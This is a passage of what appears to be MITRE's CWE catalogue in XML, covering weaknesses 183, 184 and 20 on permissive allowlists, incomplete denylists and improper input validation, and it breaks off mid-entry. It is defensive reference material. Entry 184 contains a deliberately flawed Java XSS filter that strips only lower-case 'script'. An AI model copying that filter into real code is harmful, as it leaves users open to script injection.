         <Description>The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are explicitly allowed by policy because the inputs are assumed to be safe, but the list is too permissive - that is, it allows an input that is unsafe, leading to resultant weaknesses.</Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="697" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="434" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Allowlist / Allow List</Term>
	       <Description>This is used by CWE and CAPEC instead of other commonly-used terms.  Its counterpart is denylist.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Safelist / Safe List</Term>
	       <Description>This is often used by security tools such as firewalls, email or web gateways, proxies, etc.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Whitelist / White List</Term>
	       <Description>This term is frequently used, but usage has been declining as organizations have started to adopt other terms.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2019-12799</Reference>
               <Description>chain: bypass of untrusted deserialization issue (CWE-502) by using an assumed-trusted class (CWE-183)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-12799</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-10458</Reference>
               <Description>sandbox bypass using a method that is on an allowlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-10458</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-1000095</Reference>
               <Description>sandbox bypass using unsafe methods that are on an allowlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-1000095</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2019-10458</Reference>
               <Description>CI/CD pipeline feature has unsafe elements in allowlist, allowing bypass of script restrictions</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2019-10458</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-1000095</Reference>
               <Description>Default allowlist includes unsafe methods, allowing bypass of sandbox</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-1000095</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Permissive Whitelist</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Eliminating Metacharacters&#34;, Page 435"/>
         </References>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Description, Relationships, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description, Observed_Examples, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
		<Previous_Entry_Name Date="2020-02-24">Permissive Whitelist</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="184" Name="Incomplete List of Disallowed Inputs" Abstraction="Base" Structure="Simple" Status="Draft">
         <Description>The product implements a protection mechanism that relies on a list of inputs (or properties of inputs) that are not allowed by policy or otherwise require other action to neutralize before additional processing takes place, but the list is incomplete, leading to resultant weaknesses.</Description>
         <Extended_Description>Developers often try to protect their products against malicious input by performing tests against inputs that are known to be bad, such as special characters that can invoke new commands.  However, such lists often only account for the most well-known bad inputs. Attackers may be able to find other malicious inputs that were not expected by the developer, allowing them to bypass the intended protection mechanism.</Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="1023" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="79" View_ID="1000" Chain_ID="692"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="78" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="434" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="98" View_ID="1000"/>
         </Related_Weaknesses>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Denylist / Deny List</Term>
	       <Description>This is used by CWE and CAPEC instead of other commonly-used terms.  Its counterpart is allowlist.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Blocklist / Block List</Term>
	       <Description>This is often used by security tools such as firewalls, email or web gateways, proxies, etc.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>Blacklist / Black List</Term>
	       <Description>This term is frequently used, but usage has been declining as organizations have started to adopt other terms.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
	       <Note>Developers might begin to develop a list of bad inputs as a fast way to fix a particular weakness, instead of fixing the root cause. See [REF-141].</Note>
            </Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
	       <Note>The design might rely solely on detection of malicious inputs as a protection mechanism.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Common_Consequences>
            <Consequence>
               <Scope>Access Control</Scope>
               <Impact>Bypass Protection Mechanism</Impact>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Black Box</Method>
               <Description>Exploitation of a vulnerability with commonly-used manipulations might fail, but minor variations might succeed.</Description>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation>
               <Phase>Implementation</Phase>
               <Strategy>Input Validation</Strategy>
               <Description>Do not rely exclusively on detecting disallowed inputs.  There are too many variants to encode a character, especially when different environments are used, so there is a high likelihood of missing some variants.  Only use detection of disallowed inputs as a mechanism for detecting suspicious activity. Ensure that you are using other protection mechanisms that only identify "good" input - such as lists of allowed inputs - and ensure that you are properly encoding your outputs.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>The following code attempts to stop XSS attacks by removing all occurences of "script" in an input string.</Intro_Text>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>public String removeScriptTags(String input, String mask) {<xhtml:div style="margin-left:1em;">return input.replaceAll("script", mask);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Because the code only checks for the lower-case "script" string, it can be easily defeated with upper-case script tags.</Body_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2008-2309</Reference>
               <Description>product uses a denylist to identify potentially dangerous content, allowing attacker to bypass a warning</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-2309</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2782</Reference>
               <Description>PHP remote file inclusion in web application that filters "http" and "https" URLs, but not "ftp".</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2782</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0542</Reference>
               <Description>Programming language does not filter certain shell metacharacters in Windows environment.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0542</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-0595</Reference>
               <Description>XSS filter doesn't filter null characters before looking for dangerous tags, which are ignored by web browsers. MIE and validate-before-cleanse.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-0595</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-3287</Reference>
               <Description>Web-based mail product doesn't restrict dangerous extensions such as ASPX on a web server, even though others are prohibited.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-3287</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2004-2351</Reference>
               <Description>Resultant XSS when only &lt;script&gt; and &lt;style&gt; are checked.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2004-2351</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2959</Reference>
               <Description>Privileged program does not clear sensitive environment variables that are used by bash. Overlaps multiple interpretation error.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2959</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1824</Reference>
               <Description>SQL injection protection scheme does not quote the "\" special character.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1824</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2184</Reference>
               <Description>Detection of risky filename extensions prevents users from automatically executing .EXE files, but .LNK is accepted, allowing resultant Windows symbolic link.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2184</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-1343</Reference>
               <Description>Product uses list of protected variables, but accidentally omits one dangerous variable, allowing external modification</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-1343</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5727</Reference>
               <Description>Chain: product only removes SCRIPT tags (CWE-184), enabling XSS (CWE-79)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5727</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2006-4308</Reference>
               <Description>Chain: product only checks for use of "javascript:" tag (CWE-184), allowing XSS (CWE-79) using other tags</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2006-4308</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-3572</Reference>
               <Description>Chain: OS command injection (CWE-78) enabled by using an unexpected character that is not explicitly disallowed (CWE-184)</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-3572</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-0661</Reference>
               <Description>"\" not in list of disallowed values for web server, allowing path traversal attacks when the server is run on Windows and other OSes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-0661</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="PLOVER">
               <Entry_Name>Incomplete Blacklist</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="120"/>
            <Related_Attack_Pattern CAPEC_ID="15"/>
            <Related_Attack_Pattern CAPEC_ID="182"/>
            <Related_Attack_Pattern CAPEC_ID="3"/>
            <Related_Attack_Pattern CAPEC_ID="43"/>
            <Related_Attack_Pattern CAPEC_ID="6"/>
            <Related_Attack_Pattern CAPEC_ID="71"/>
            <Related_Attack_Pattern CAPEC_ID="73"/>
            <Related_Attack_Pattern CAPEC_ID="85"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-140"/>
            <Reference External_Reference_ID="REF-141"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 8, &#34;Eliminating Metacharacters&#34;, Page 435"/>
         </References>
         <Notes>
            <Note Type="Relationship">
               <xhtml:p>Multiple interpretation errors can indirectly introduce inputs that should be disallowed. For example, a list of dangerous shell metacharacters might not include a metacharacter that only has meaning in one particular shell, not all of them; or a check for XSS manipulations might ignore an unusual construct that is supported by one web browser, but not others.</xhtml:p>
            </Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>PLOVER</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Name>Sean Eidemiller</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>added/updated demonstrative examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>Eric Dalci</Modification_Name>
               <Modification_Organization>Cigital</Modification_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Detection_Factors, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-11-24</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Description, Other_Notes, Relationship_Notes, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-05-03</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated Observed_Examples, Relationships</Modification_Comment>
            </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-01-03</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2019-06-20</Modification_Date>
					<Modification_Comment>updated Related_Attack_Patterns, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-02-24</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Description, Detection_Factors, Modes_of_Introduction, Name, Observed_Examples, Potential_Mitigations, Relationship_Notes, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2020-06-25</Modification_Date>
					<Modification_Comment>updated Alternate_Terms, Observed_Examples</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
			<Previous_Entry_Name Date="2020-02-24">Incomplete Blacklist</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="20" Name="Improper Input Validation" Abstraction="Class" Structure="Simple" Status="Stable">
        <Description>The product receives input or data, but it does
        not validate or incorrectly validates that the input has the
        properties that are required to process the data safely and
        correctly.</Description>
         <Extended_Description>
	   <xhtml:p>Input validation is a frequently-used technique
	   for checking potentially dangerous inputs in order to
	   ensure that the inputs are safe for processing within the
	   code, or when communicating with other components.  When
	   software does not validate input properly, an attacker is
	   able to craft the input in a form that is not expected by
	   the rest of the application. This will lead to parts of the
	   system receiving unintended input, which may result in
	   altered control flow, arbitrary control of a resource, or
	   arbitrary code execution.</xhtml:p>
	   <xhtml:p>Input validation is not the only technique for
	   processing input, however.  Other techniques attempt to
	   transform potentially-dangerous input into something safe, such
	   as filtering (CWE-790) - which attempts to remove dangerous
	   inputs - or encoding/escaping (CWE-116), which attempts to
	   ensure that the input is not misinterpreted when it is included
	   in output to another component. Other techniques exist as well
	   (see CWE-138 for more examples.)</xhtml:p>
	   <xhtml:p>Input validation can be applied to:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>raw data - strings, numbers, parameters, file contents, etc.</xhtml:li>
	     <xhtml:li>metadata - information about the raw data, such as headers or size</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Data can be simple or structured.  Structured data
	   can be composed of many nested layers, composed of
	   combinations of metadata and raw data, with other simple or
	   structured data.</xhtml:p>
	   <xhtml:p>Many properties of raw data or metadata may need
	   to be validated upon entry into the code, such
	   as:</xhtml:p>
	   <xhtml:ul>
	     <xhtml:li>specified quantities such as size, length, frequency, price, rate, number of operations, time, etc.</xhtml:li>
	     <xhtml:li>implied or derived quantities, such as the actual size of a file instead of a specified size</xhtml:li>
	     <xhtml:li>indexes, offsets, or positions into more complex data structures</xhtml:li>
	     <xhtml:li>symbolic keys or other elements into hash tables, associative arrays, etc.</xhtml:li>
	     <xhtml:li>well-formedness, i.e. syntactic correctness - compliance with expected syntax </xhtml:li>
	     <xhtml:li>lexical token correctness - compliance with rules for what is treated as a token</xhtml:li>
	     <xhtml:li>specified or derived type - the actual type of the input (or what the input appears to be)</xhtml:li>
	     <xhtml:li>consistency - between individual data elements, between raw data and metadata, between references, etc.</xhtml:li>
	     <xhtml:li>conformance to domain-specific rules, e.g. business logic </xhtml:li>
	     <xhtml:li>equivalence - ensuring that equivalent inputs are treated the same</xhtml:li>
	     <xhtml:li>authenticity, ownership, or other attestations about the input, e.g. a cryptographic signature to prove the source of the data</xhtml:li>
	   </xhtml:ul>
	   <xhtml:p>Implied or derived properties of data must often
	   be calculated or inferred by the code itself.  Errors in
	   deriving properties may be considered a contributing factor
	   to improper input validation.
	   </xhtml:p>
	   <xhtml:p>Note that "input validation" has very different
	   meanings to different people, or within different
	   classification schemes.  Caution must be used when
	   referencing this CWE entry or mapping to it.  For example,
	   some weaknesses might involve inadvertently giving control
	   to an attacker over an input when they should not be able
	   to provide an input at all, but sometimes this is referred
	   to as input validation.</xhtml:p>
	   <xhtml:p>Finally, it is important to emphasize that the
	   distinctions between input validation and output escaping
	   are often blurred, and developers must be careful to
	   understand the difference, including how input validation
	   is not always sufficient to prevent vulnerabilities,
	   especially when less stringent data types must be
	   supported, such as free-form text. Consider a SQL injection
	   scenario in which a person's last name is inserted into a
	   query. The name "O'Reilly" would likely pass the validation
	   step since it is a common last name in the English
	   language. However, this valid name cannot be directly
	   inserted into the database because it contains the "'"
	   apostrophe character, which would need to be escaped or
	   otherwise transformed. In this case, removing the
	   apostrophe might reduce the risk of SQL injection, but it
	   would produce incorrect behavior because the wrong name
	   would be recorded.</xhtml:p>
       </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="707" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="345" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="22" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="41" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="74" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="119" View_ID="1000"/>
            <Related_Weakness Nature="CanPrecede" CWE_ID="770" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Class="Not Language-Specific" Prevalence="Often"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>
                  <xhtml:p>REALIZATION: This weakness is caused during implementation of an architectural security tactic.</xhtml:p>
                  <xhtml:p>If a programmer believes that an attacker cannot modify certain inputs, then the programmer might not perform any input validation at all. For example, in web applications, many programmers believe that cookies and hidden form fields can not be modified from a web browser (CWE-472), although they can be altered using a proxy or a custom program. In a client-server architecture, the programmer might assume that client-side security checks cannot be bypassed, even when a custom client could be written that skips those checks (CWE-602).</xhtml:p>
               </Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Availability</Scope>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>An attacker could provide unexpected values and cause a program crash or excessive consumption of resources, such as memory and CPU.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
               <Impact>Read Files or Directories</Impact>
               <Note>An attacker could read confidential data if they are able to control resource references.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Modify Memory</Impact>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Note>An attacker could use malicious input to modify data or possibly alter control flow in unexpected ways, including arbitrary command execution.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-3">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>Some instances of improper input validation can be detected using automated static analysis.</xhtml:p>
                  <xhtml:p>A static analysis tool might allow the user to specify which application-specific methods or functions perform input validation; the tool might also have built-in knowledge of validation frameworks such as Struts. The tool may then suppress or de-prioritize any associated warnings. This allows the analyst to focus on areas of the software in which input validation does not appear to be present.</xhtml:p>
                  <xhtml:p>Except in the cases described in the previous paragraph, automated static analysis might not be able to recognize when proper input validation is being performed, leading to false positives - i.e., warnings that do not have any security consequences or require any code changes.</xhtml:p>
               </Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-4">
               <Method>Manual Static Analysis</Method>
               <Description>When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.</Description>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-5">
               <Method>Fuzzing</Method>
               <Description>Fuzzing techniques can be useful for detecting input validation errors. When unexpected inputs are provided to the software, the software should not crash or otherwise become unstable, and it should generate application-controlled error messages. If exceptions or interpreter-generated error messages occur, this indicates that the input was not detected and handled within the application logic itself.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
